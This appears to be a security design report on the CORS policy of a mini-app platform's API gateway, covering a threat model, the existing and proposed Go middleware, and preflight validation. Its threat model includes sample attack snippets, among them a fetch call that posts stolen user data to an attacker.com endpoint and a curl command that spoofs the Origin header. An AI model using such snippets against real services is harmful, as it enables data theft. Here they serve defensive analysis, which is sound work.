# P3.4: CORS Strategy for Mini-App Platform
## 7-STEP ANALYSIS REPORT

**Date:** 2026-03-21
**Phase:** P3.4
**Scope:** Cross-Origin Resource Sharing (CORS) strategy for OHMF mini-app platform
**Status:** Implementation Complete

---

## EXECUTIVE SUMMARY

The OHMF mini-app platform requires a robust CORS strategy to enable mini-apps running in sandboxed iframes to securely communicate with the gateway API using Bearer token authentication. This report provides a comprehensive 7-step analysis including threat modeling, implementation architecture, and security validation.

**Key Finding:** The platform is already partially configured for Bearer token auth, but the existing CORS middleware uses `AllowCredentials: true`, which is incompatible with this architecture and creates unnecessary attack surface.

**Recommendation:** Implement new CORS middleware that validates origins explicitly, rejects requests from unauthorized sources at the preflight stage, and works seamlessly with Bearer token authentication.

### 1.2 Threat Model

#### Threat 1: Cross-Site Request Forgery (CSRF)

**Scenario:** Attacker's website tricks browser into sending requests to gateway

**Attack Vector:**
```html
<!-- attacker.com -->
<img src="https://gateway.example.com/v1/messages?id=123&delete=true" />
```

**Mitigation:**
- Origin header validation: Browser enforces, cannot be spoofed from JavaScript
- Bearer tokens don't auto-include like cookies
- Preflight checks catch unauthorized origins early
- Only exact origin match allowed in production

**Residual Risk:** Low (browser enforces Origin header, server validates it)

#### Threat 2: Token Leakage via CORS Misconfiguration

**Scenario:** Overly permissive CORS exposes tokens to attacker-controlled origins

**Attack Vector:**
```javascript
// attacker.com under https://miniapps.example.com
fetch('https://gateway.example.com/v1/me', {
  headers: { 'Authorization': 'Bearer attacker_token' }
})
.then(r => r.json())
.then(data => fetch('https://attacker.com/steal', { method: 'POST', body: JSON.stringify(data) }))
```

**Mitigation:**
- Explicit origin allowlist, no wildcards in production
- `AllowCredentials: false` prevents credential-based attacks
- Each origin explicitly registered and vetted
- Monitor for suspicious CORS rejection patterns

**Residual Risk:** Medium (depends on allowlist accuracy and maintenance)

#### Threat 3: Sub-Domain Takeover

**Scenario:** Attacker controls compromised subdomain that matches CORS pattern

**Attack Vector:**
```
Attacker registers: api-backup.example.com (typosquatter)
CORS config allows: *.example.com (wildcard)
Attacker can now make CORS requests to gateway
```

**Mitigation:**
- Use specific subdomain allowlist, not wildcards
- Example: `https://miniapps.example.com` (not `https://*.example.com`)
- Monitor DNS and certificate issuance
- CSP header restricts frame-ancestors

**Residual Risk:** Medium (requires DNS/cert monitoring)

#### Threat 4: Origin Header Spoofing Attempt

**Scenario:** Attacker modifies Origin header in cross-origin request

**Attack Vector:**
```bash
curl -H "Origin: https://trusted.example.com" \
     https://gateway.example.com/v1/messages
```

**Mitigation:**
- Browser enforces Origin header, cannot be spoofed from JavaScript
- Server validates Origin header on every CORS request
- Preflight validation prevents actual request if invalid

**Residual Risk:** Very Low (browser enforces, server double-checks)

#### Threat 5: Cache Poisoning via CORS Headers

**Scenario:** Intermediate cache stores CORS headers for one origin, serves to another

**Attack Vector:**
```
Request 1: Origin: https://app.example.com
  Response: Access-Control-Allow-Origin: https://app.example.com
  Cache-Control: public

Request 2: Origin: https://attacker.com
  (cache serves cached response with wrong CORS headers)
```

**Mitigation:**
- CDN must include Origin in cache key
- CloudFront: Cache policy includes Authorization, Origin
- nginx: Cache based on origin header
- Vary: Origin response header

**Residual Risk:** Low (if CDN properly configured)

#### Threat 6: Token Exfiltration via ExposedHeaders

**Scenario:** Attacker-controlled origin receives sensitive headers

**Attack Vector:**
```javascript
// If X-Auth-Token in ExposedHeaders
fetch('https://gateway.example.com/v1/me')
  .then(r => {
    console.log(r.headers.get('X-Auth-Token')); // LEAK!
  })
```

**Mitigation:**
- Never include auth tokens in response headers
- `ExposedHeaders` only includes non-sensitive values (X-Request-ID, Link)
- Bearer tokens in Authorization header (not exposed to JavaScript)

**Residual Risk:** Very Low (no auth headers exposed)

### 1.3 Threat Summary

| Threat | Severity | Likelihood | Mitigation Status |
|--------|----------|------------|------------------|
| CSRF | High | Low | Mitigated (preflight) |
| Token Leakage | High | Medium | Needs allowlist enforcement |
| Sub-domain Takeover | High | Low | Needs DNS monitoring |
| Origin Spoofing | Medium | Very Low | Browser enforces |
| Cache Poisoning | Medium | Medium | Needs CDN config |
| Token Exfiltration | High | Very Low | Correct by design |

## STEP 2: ARCHITECTURE ANALYSIS

### 2.1 Current State

**Existing CORS Middleware (main.go, lines 284-299):**

```go
r.Use(cors.Handler(cors.Options{
  AllowOriginFunc: func(_ *http.Request, origin string) bool {
    if origin == "" {
      return false
    }
    if cfg.AllowedOrigin != "*" && origin == cfg.AllowedOrigin {
      return true
    }
    return strings.HasPrefix(origin, "http://localhost:") || strings.HasPrefix(origin, "http://127.0.0.1:")
  },
  AllowedMethods:   []string{"GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"},
  AllowedHeaders:   []string{"Accept", "Authorization", "Content-Type", "X-CSRF-Token"},
  ExposedHeaders:   []string{"Link"},
  AllowCredentials: true,        // ❌ PROBLEM: Incompatible with Bearer tokens
  MaxAge:           300,         // 5 minutes (too short)
}))
```

**Issues:**
1. `AllowCredentials: true` means cookies are expected (but not used)
2. When `AllowCredentials: true`, cannot use wildcard origin `*`
3. MaxAge too short for production (5 min vs 1-24 hours typical)
4. go-chi/cors doesn't provide fine-grained control for this use case

### 2.3 Proposed Architecture

**New CORS Middleware (`internal/middleware/cors.go`):**

```go

  AllowedOrigins   []string      // e.g., ["http://localhost:*", "https://app.example.com"]
  AllowedMethods   []string      // GET, POST, PUT, DELETE, OPTIONS
  AllowedHeaders   []string      // Authorization, Content-Type, etc.
  ExposedHeaders   []string      // X-Request-ID, Link
  MaxAge           int           // seconds
  AllowCredentials bool          // false for Bearer tokens
}

func ValidateCORS(w ResponseWriter, r Request, policy) bool
  // Extract Origin header
  // Check against AllowedOrigins
  // Set response headers if valid
  // Return false if invalid (origin not allowed)

func HandlePreflight(w ResponseWriter, r Request, policy)
  // Only process if r.Method == OPTIONS
  // Validate CORS
  // Return 204 No Content with headers or 403 Forbidden

func CORSMiddleware(policy) http.Handler
  // Middleware wrapper
  // Call HandlePreflight for OPTIONS
  // Call ValidateCORS for other methods
```

#### Component 1: CORS Middleware (`cors.go`)

**Functions:**

| Function | Purpose | Behavior |
|----------|---------|----------|
| `ValidateCORS(w, r, policy)` | Validate and set headers | Returns bool (allowed/rejected) |
| `HandlePreflight(w, r, policy)` | Handle OPTIONS requests | Returns 204 or 403 |
| `CORSMiddleware(policy)` | HTTP middleware wrapper | Returns wrapped handler |

**Key Logic:**

```go
// Validate origin against allowlist
if !isOriginAllowed(origin, policy.AllowedOrigins) {
  return false  // Request rejected, no CORS headers set
}

// Set response headers

w.Header().Set("Access-Control-Allow-Methods", strings.Join(policy.AllowedMethods, ", "))
// ... more headers

```

**Pattern Support:**

- Exact match: `"https://app.example.com"` → Only that origin
- Wildcard: `"*"` → Any origin (dev only)

## STEP 4: SECURITY VALIDATION

### 4.1 Bearer Token Flow Security

**Request with Bearer Token:**

```
Browser Request:
  OPTIONS /v1/messages HTTP/1.1
  Origin: http://localhost:5174
  Access-Control-Request-Headers: authorization

Server Response:
  HTTP/1.1 204 No Content
  Access-Control-Allow-Origin: http://localhost:5174
  Access-Control-Allow-Headers: authorization, content-type

Browser Sends Actual Request:
  POST /v1/messages HTTP/1.1
  Origin: http://localhost:5174
  Authorization: Bearer eyJhbGc...
  Content-Type: application/json

  {"text": "Hello"}

Server Response:
  HTTP/1.1 200 OK
  Access-Control-Allow-Origin: http://localhost:5174
  X-Request-ID: req_abc123

  {"id": "msg_123", "status": "sent"}
```

**Security Properties:**

- ✅ Token sent in Authorization header (not accessible to JavaScript from other origins)
- ✅ Token NOT included in cookies (cannot be auto-sent)
- ✅ AllowCredentials=false prevents credential-based attacks
- ✅ Origin validated before token exposure
- ✅ No token in response headers or CORS-exposed headers

### 4.2 Preflight Validation

**Invalid Origin Rejected at Preflight:**

```
Attacker Browser Request:
  OPTIONS /v1/messages HTTP/1.1
  Origin: https://evil.com
  Access-Control-Request-Headers: authorization

Server Response:
  HTTP/1.1 403 Forbidden
  (no CORS headers)

Browser Error:
  Access to XMLHttpRequest at 'https://gateway.example.com/v1/messages'
  from origin 'https://evil.com' has been blocked by CORS policy:
  Response to preflight request doesn't pass access control check
```

**Attacker Cannot:**
- ❌ Proceed to actual request (browser blocks after preflight failure)
- ❌ Send token to gateway (never reaches server)
- ❌ Exfiltrate data (response blocked by browser)

### 4.3 Cache Poisoning Prevention

**CDN Configuration for Cache Key:**

```
CloudFront Cache Key:
  ✅ Include: Origin header
  ✅ Include: Authorization header
  ✅ Exclude: Sensitive headers from cache

Result: Separate cache entries per (Origin, Authorization, Path)
  - App1 origin gets correct CORS headers
  - Attacker origin doesn't benefit from cached response
```

### 4.4 Cryptographic Security

**No Cryptography Needed:**

- ✅ Origin header validated by browser (no need to sign)
- ✅ Bearer tokens use standard JWT + signature
- ✅ HTTPS transport protects headers in transit
- ✅ No additional signing needed for CORS headers
